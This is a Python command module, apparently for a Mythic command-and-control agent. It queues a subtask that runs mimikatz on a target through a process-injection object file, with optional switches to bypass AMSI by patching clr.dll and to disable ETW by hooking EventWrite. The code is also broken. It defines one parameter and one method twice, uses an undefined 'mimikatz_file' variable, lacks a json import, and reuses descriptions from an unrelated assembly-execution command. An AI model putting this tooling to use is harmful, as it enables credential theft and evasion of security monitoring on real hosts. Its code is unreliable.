from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..utils.packer import serialize_int, serialize_bool, serialize_string
import logging, sys
import os
import tempfile
import base64
# BOF utilities
from .utils.mythicrpc_utilities import *
from .utils.bof_utilities import *

logging.basicConfig(level=logging.INFO)


class MimikatzArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Already existing .NET assembly to execute (e.g. SharpUp.exe)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]),
            CommandParameter(
                name="assembly_file",
                display_name="New Assembly",
                type=ParameterType.File,
                description="A new .NET assembly to execute. After uploading once, you can just supply the -Assembly parameter",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="New Assembly", 
                        ui_position=1,
                    )
                ]
            ),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=2
                    ),
                ],
            ),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=2
                    ),
                ],
            ),
            CommandParameter(
                name="patch_exit",
                cli_name="-patchexit",
                display_name="patchexit",
                type=ParameterType.Boolean,
                description="Patches System.Environment.Exit to prevent Beacon process from exiting",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=3,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=3
                    ),
                ],
            ),
            CommandParameter(
                name="amsi",
                cli_name="-amsi",
                display_name="amsi",
                type=ParameterType.Boolean,
                description="Bypass AMSI by patching clr.dll instead of amsi.dll to avoid common detections",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=4,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=4
                    ),
                ],
            ),
            CommandParameter(
                name="etw",
                cli_name="-etw",
                display_name="etw",
                type=ParameterType.Boolean,
                description="Bypass ETW by EAT Hooking advapi32.dll!EventWrite to point to a function that returns right away",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=5,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=5
                    ),
                ],
            ),
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require an assembly to execute.\n\tUsage: {}".format(
                    MimikatzArguments.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])

class MimikatCommand(CoffCommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz -Arguments [args]"
    description = "Execute mimikatz on the host. OPSEC Warning: Uses donut shellcode."
    version = 1
    author = "@c0rnbread"
    script_only = True
    attackmapping = []
    argument_class = MimikatzArguments
    attributes = CommandAttributes(
        dependencies=["inline_execute"],
        alias=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        '''
            Steps:
                1. Parse arguments
                    a. mimi arguments
                2. generate PIC for mimikatz
                3. Get file id for inject_spawn.x64.o
                
                4. send subtask
        '''
        try:

            ######################################
            #                                    #
            #   Send SubTask to inline_execute   #
            #                                    #
            ######################################      
                  
            
            # Process Injection Kit
            file_name = "inject_spawn.x64.o"
            # Usually this BOF takes ignoreToken and ptr PIC dll but we don't care about either.
            arguments = []
            
            
            # Debugging
            # logging.info(taskData.args.to_json())
            
            # Run inline_execute subtask
            subtask = await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    taskData.Task.ID,
                    CommandName="inline_execute",
                    SubtaskCallbackFunction="coff_completion_callback",
                    Params=json.dumps({
                        "bof_name": file_name,
                        "bof_arguments": arguments,
                        "mimikatz_file": mimikatz_file
                    }),
                    Token=taskData.Task.TokenID,
                )
            )
                   
            #Debugging
            logging.info(taskData.args.to_json())
            
            return response


        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp